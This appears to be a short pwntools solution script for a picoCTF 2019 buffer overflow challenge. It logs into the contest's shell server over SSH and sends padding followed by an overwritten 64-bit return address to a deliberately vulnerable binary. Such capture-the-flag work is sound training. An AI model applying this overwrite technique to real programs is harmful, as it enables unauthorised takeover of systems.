from pwn import *
import time

binary = "./newoverflow1"
#
#p = process(binary)
#
passwd = input().rstrip()
s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)
p = s.process("vuln",cwd="/problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89")

payload=b"A"*0x40
payload+=b"b"*8
payload+=p64(0x00400768) #0x10
p.sendlineafter(b"flag: ",payload)
p.interactive()